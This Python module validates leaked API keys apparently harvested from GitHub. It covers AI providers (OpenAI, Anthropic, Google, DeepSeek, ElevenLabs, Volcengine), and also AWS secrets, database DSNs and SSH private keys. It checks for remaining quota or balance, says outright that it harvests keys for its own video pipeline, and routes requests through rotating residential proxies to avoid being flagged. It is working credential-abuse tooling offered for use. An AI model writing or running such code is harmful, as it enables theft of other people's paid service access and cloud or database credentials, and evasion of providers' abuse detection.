"""
Live validation of found keys against provider APIs.
Returns True if key is confirmed active (not revoked).

All validation requests go through Evomi residential proxy if EVOMI_PROXY is set.
This prevents Railway's datacenter IP from being flagged by provider APIs
after repeated validation attempts.

Set on Railway:
  EVOMI_PROXY=http://user:password@rp.evomi.com:1000
  (country-rotate automatically — no extra config needed)
"""

import asyncio
import os
import random
import logging
import urllib.parse

import httpx

log = logging.getLogger(__name__)

_TIMEOUT = httpx.Timeout(15.0)

# Evomi residential proxy pool — validation calls only, not GitHub API.
# Format: comma-separated list for redundancy/load distribution.
#   EVOMI_PROXY=http://user:pass@rp.evomi.com:1000
#   EVOMI_PROXY=http://user:pass@rp.evomi.com:1000,http://user:pass@rp.evomi.com:1001
#
# Evomi rotates the exit IP on every request by default (rotating residential).
# For country targeting: http://user-country-US:pass@rp.evomi.com:1000
# Estimated traffic: ~5KB/validation × 500 validations/day ≈ 2.5MB/day ≈ $0.001/day
_PROXY_URLS: list[str] = [
    u.strip()
    for u in os.environ.get("EVOMI_PROXY", "").split(",")
    if u.strip()
]


def _client(**kwargs) -> httpx.AsyncClient:
    """Return an AsyncClient optionally routed through a random Evomi proxy."""
    if _PROXY_URLS:
        proxy = random.choice(_PROXY_URLS)
        return httpx.AsyncClient(timeout=_TIMEOUT, proxy=proxy, **kwargs)
    return httpx.AsyncClient(timeout=_TIMEOUT, **kwargs)


# ── Quota-aware AI provider validators ─────────────────────────────────────
# A key is "valid" only if it can actually run inference. /models endpoints
# return 200 even for keys with $0 balance, leaked-then-blocked keys, and
# keys whose project never enabled the API. We do a 1-token completion (or
# a balance lookup where the provider exposes one) and parse the error body
# for known dead-key signatures.
#
# Cost per check: ~$0.0000007 (gpt-4o-mini, 1+1 tokens) — negligible since
# validation runs ONCE per new key (key_exists() gate in scanner).

def _err_field(body: dict, *path: str) -> str:
    cur = body
    for p in path:
        if not isinstance(cur, dict):
            return ""
        cur = cur.get(p, "")
    return str(cur or "")


async def validate_openai(key: str) -> bool:
    """
    True only if key works AND has usable quota.
    Detects: insufficient_quota (429 + error.code), revoked (401), org-disabled (403).
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"Authorization": f"Bearer {key}"},
                json={
                    "model":      "gpt-4o-mini",
                    "messages":   [{"role": "user", "content": "hi"}],
                    "max_tokens": 1,
                },
            )
            if r.status_code == 200:
                return True
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            code  = _err_field(body, "error", "code")
            etype = _err_field(body, "error", "type")
            if code == "insufficient_quota" or etype == "insufficient_quota":
                return False
            if code in ("invalid_api_key", "account_deactivated"):
                return False
            # Real rate-limit / transient server errors — key works
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("openai validate err: %s", e)
        return False


async def validate_anthropic(key: str) -> bool:
    """
    True only if key works AND has credit balance.
    Detects: 'credit balance is too low' (400), invalid key (401).
    """
    try:
        async with _client() as c:
            r = await c.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key":         key,
                    "anthropic-version": "2023-06-01",
                },
                json={
                    "model":      "claude-haiku-4-5-20251001",
                    "max_tokens": 1,
                    "messages":   [{"role": "user", "content": "hi"}],
                },
            )
            if r.status_code == 200:
                return True
            if r.status_code in (401, 403):
                return False
            try:
                body = r.json()
            except Exception:
                body = {}
            msg = _err_field(body, "error", "message").lower()
            if "credit balance" in msg or "insufficient" in msg or "billing" in msg:
                return False
            if r.status_code == 400 and "invalid" in msg and "api" in msg:
                return False
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("anthropic validate err: %s", e)
        return False


async def validate_google(key: str) -> bool:
    """
    True only if key can run generation.
    Detects:
      - 'API key was reported as leaked' (Google Secret Scanning auto-block)
      - 'Generative Language API has not been used' (project never enabled the API)
      - INVALID_ARGUMENT / PERMISSION_DENIED / RESOURCE_EXHAUSTED
    """
    if key.startswith("sa:"):
        return False  # service-account JSON requires OAuth, not API-key flow
    try:
        async with _client() as c:
            r = await c.post(
                "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent",
                params={"key": key},
                json={
                    "contents":         [{"parts": [{"text": "hi"}]}],
                    "generationConfig": {"maxOutputTokens": 1},
                },
            )
            if r.status_code == 200:
                return True
            try:
                body = r.json()
            except Exception:
                body = {}
            status = _err_field(body, "error", "status")
            msg    = _err_field(body, "error", "message").lower()
            if "reported as leaked" in msg:
                return False
            if "has not been used" in msg or "is disabled" in msg:
                return False
            if "api key not valid" in msg or "api_key_invalid" in msg:
                return False
            if status in ("RESOURCE_EXHAUSTED", "PERMISSION_DENIED",
                          "INVALID_ARGUMENT", "UNAUTHENTICATED", "FAILED_PRECONDITION"):
                return False
            return r.status_code in (429, 500, 502, 503, 504)
    except Exception as e:
        log.debug("google validate err: %s", e)
        return False


async def validate_deepseek(key: str) -> bool:
    """
    True only if key works AND total_balance > 0.
    Uses /user/balance endpoint — no completion spend, exact balance read.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.deepseek.com/user/balance",
                headers={"Authorization": f"Bearer {key}"},
            )
            if r.status_code != 200:
                return False
            body = r.json()
            if not body.get("is_available", False):
                return False
            for b in body.get("balance_infos", []):
                try:
                    if float(b.get("total_balance", "0")) > 0:
                        return True
                except (TypeError, ValueError):
                    continue
            return False
    except Exception as e:
        log.debug("deepseek validate err: %s", e)
        return False


async def validate_elevenlabs(key: str) -> bool:
    """
    True only if key works AND character quota not exhausted.
    /v1/user returns subscription.{character_count, character_limit}.
    """
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.elevenlabs.io/v1/user",
                headers={"xi-api-key": key},
            )
            if r.status_code != 200:
                return False
            sub   = (r.json() or {}).get("subscription", {}) or {}
            used  = sub.get("character_count", 0) or 0
            limit = sub.get("character_limit", 0) or 0
            # limit=0 or unlimited tier → has quota; otherwise must have headroom
            if limit <= 0:
                return True
            return used < limit
    except Exception as e:
        log.debug("elevenlabs validate err: %s", e)
        return False


# ARK / Volcengine probe regions. Try CN mainland first (most accounts),
# fall back to international endpoint for Volcengine Global keys.
_ARK_REGIONS = [
    "https://ark.cn-beijing.volces.com",
    "https://ark.ap-southeast.volces.com",
]

# Seedance video models — probe order: cheapest first to minimize cost
# if validation accidentally creates a task (we cancel best-effort below).
_ARK_SEEDANCE_MODELS = [
    "doubao-seedance-1-0-lite-i2v-250428",   # image-to-video lite
    "doubao-seedance-1-0-lite-t2v-250428",   # text-to-video lite
    "doubao-seedance-1-0-pro-250528",        # pro (most expensive)
]

# Cheap Doubao chat model for the auth pre-check — distinguishes
# "dead key" from "alive key but no Seedance access".
_ARK_DOUBAO_CHAT = "doubao-1-5-lite-32k-250115"


def _ark_err_code(body: dict) -> str:
    """Volcengine returns either {error: {code, message}} or top-level Code/Message."""
    if not isinstance(body, dict):
        return ""
    err = body.get("error")
    if isinstance(err, dict):
        return err.get("code", "") or ""
    return body.get("Code", "") or body.get("code", "") or ""


async def _ark_post(url: str, key: str, payload: dict) -> tuple[int, dict]:
    host = urllib.parse.urlparse(url).hostname or ""
    try:
        async with _client() as c:
            r = await c.post(
                url,
                headers={"Authorization": f"Bearer {key}", "Host": host},
                json=payload,
            )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {}
    except Exception as e:
        log.debug("ark post err (%s): %s", url, e)
        return 0, {}


async def _ark_cancel_task(region: str, key: str, task_id: str):
    """Best-effort cancel — bounds cost if validation accidentally created a task."""
    try:
        async with _client() as c:
            await c.delete(
                f"{region}/api/v3/contents/generations/tasks/{task_id}",
                headers={"Authorization": f"Bearer {key}"},
            )
    except Exception:
        pass


async def validate_ark(key: str) -> bool:
    """
    True only if ARK key auth-passes AND has at least one Seedance video
    model activated. Chat-only or zero-models accounts → invalid: we harvest
    specifically for the seedance video pipeline, a Doubao-text-only key
    is useless to us.

    Detects:
      - 401 / AuthenticationFailed → dead key
      - ModelNotOpen on every Seedance model → no video access
      - InvalidEndpointOrModel.NotFound on every probe → no Seedance available
      - 200 / 429 / param-level 4xx on any Seedance model → valid
    """
    for region in _ARK_REGIONS:
        # Step 1: auth pre-check via cheap Doubao chat (~$0.0000005).
        status, body = await _ark_post(f"{region}/api/v3/chat/completions", key, {
            "model":      _ARK_DOUBAO_CHAT,
            "messages":   [{"role": "user", "content": "hi"}],
            "max_tokens": 1,
        })
        if status == 0:
            continue  # network issue — try next region
        code = _ark_err_code(body)
        if status == 401 or code in ("AuthenticationFailed", "InvalidApiKey", "Unauthorized"):
            return False  # dead key — no point trying other regions

        # Step 2: probe Seedance models via task endpoint with empty content.
        # Volcengine validates auth → model permission → params in that order,
        # so an activated model gives a param-level 4xx (no billing) and a
        # non-activated model gives ModelNotOpen / NotFound.
        tasks_url = f"{region}/api/v3/contents/generations/tasks"
        for model in _ARK_SEEDANCE_MODELS:
            s, b = await _ark_post(tasks_url, key, {
                "model":   model,
                "content": [],
            })
            if s == 200:
                # Task accidentally created (check order may differ from docs) — cancel
                task_id = (b.get("id") or "").strip()
                if task_id:
                    await _ark_cancel_task(region, key, task_id)
                return True
            if s == 429:
                return True  # rate-limited but auth + model OK
            c = _ark_err_code(b)
            if c in ("ModelNotOpen", "InvalidEndpointOrModel.NotFound"):
                continue   # try next Seedance model
            if 400 <= s < 500:
                return True  # param-level 4xx → model activated, just bad request

        # Auth passed in this region but every Seedance model is dead → useless key
        return False

    # All regions unreachable
    return False


async def validate_happyhorse(key: str) -> bool:
    try:
        async with _client() as c:
            r = await c.get(
                "https://api.runhappyhorse.net/v1/models",
                headers={"Authorization": f"Bearer {key}"},
            )
            return r.status_code in (200, 403, 429)
    except Exception as e:
        log.debug("happyhorse validate err: %s", e)
        return False


VALIDATORS: dict[str, callable] = {
    "openai":     validate_openai,
    "anthropic":  validate_anthropic,
    "google":     validate_google,
    "deepseek":   validate_deepseek,
    "elevenlabs": validate_elevenlabs,
    "ark":        validate_ark,
    "happyhorse": validate_happyhorse,
}


async def validate(provider: str, key: str) -> bool:
    fn = VALIDATORS.get(provider)
    if fn is None:
        return False
    return await fn(key)


# ── Infrastructure credential validators ───────────────────────────────────────

_DB_PORTS = {
    "postgres": 5432, "postgresql": 5432,
    "mysql": 3306, "mariadb": 3306,
    "mongodb": 27017, "mongodb+srv": 27017,
    "redis": 6379, "rediss": 6380,
    "mssql": 1433, "sqlserver": 1433,
    "clickhouse": 9000, "cassandra": 9042,
    "elasticsearch": 9200, "neo4j": 7474,
}


async def validate_database(cred: str) -> bool:
    """TCP connect to host:port extracted from DSN. Confirms host is reachable."""
    try:
        p = urllib.parse.urlparse(cred)
        host = p.hostname
        if not host or host in ("localhost", "127.0.0.1", "::1"):
            return False
        port = p.port or _DB_PORTS.get((p.scheme or "").lower(), 5432)
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=6.0
        )
        writer.close()
        await writer.wait_closed()
        return True
    except Exception:
        return False


try:
    import boto3 as _boto3
    from botocore.exceptions import ClientError as _ClientError
    _BOTO3_OK = True
except ImportError:
    _BOTO3_OK = False
    log.warning("boto3 not installed — AWS key validation disabled. Add boto3 to requirements.txt")

try:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key as _load_pem
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False
    log.warning("cryptography not installed — SSH key structural validation disabled.")


async def validate_aws(cred: str) -> bool:
    """
    Call STS GetCallerIdentity with extracted AKID+secret.
    Valid = 200 (works) OR SignatureDoesNotMatch / AccessDenied (key exists, wrong secret or permissions).
    Invalid = InvalidClientTokenId (key doesn't exist at all).
    """
    if not _BOTO3_OK:
        return False
    try:
        kid, rest = cred.split(":", 1)
        secret, _ = rest.rsplit("@", 1)
        if "secret_unknown" in secret or len(secret) < 20:
            return False

        def _sts_check():
            try:
                client = _boto3.client(
                    "sts",
                    aws_access_key_id=kid,
                    aws_secret_access_key=secret,
                    region_name="us-east-1",
                )
                client.get_caller_identity()
                return True  # fully valid
            except _ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "")
                # Key ID exists but secret/perms wrong → key is real
                return code in ("SignatureDoesNotMatch", "AccessDenied",
                                "ExpiredTokenException", "TokenRefreshRequired")
            except Exception:
                return False

        return await asyncio.to_thread(_sts_check)
    except Exception as e:
        log.debug("aws validate err: %s", e)
        return False


async def validate_ssh(cred: str) -> bool:
    """Parse PEM key structure. Valid = parses without error."""
    if not _CRYPTO_OK:
        return False
    if "BEGIN" not in cred or "PRIVATE KEY" not in cred:
        return False
    try:
        await asyncio.to_thread(_load_pem, cred.encode(), None)
        return True
    except Exception:
        return False


async def validate_alibaba(cred: str) -> bool:
    return False  # requires Alibaba SDK + STS; skip for now


async def validate_azure(cred: str) -> bool:
    return False  # requires Azure SDK; skip for now


async def validate_infra_token(cred: str) -> bool:
    return False  # deploy tokens require per-service API call; skip for now


INFRA_VALIDATORS: dict[str, callable] = {
    "database": validate_database,
    "ssh":      validate_ssh,
    "aws":      validate_aws,
    "alibaba":  validate_alibaba,
    "azure":    validate_azure,
    "infra":    validate_infra_token,
    "gcp":      validate_infra_token,
}
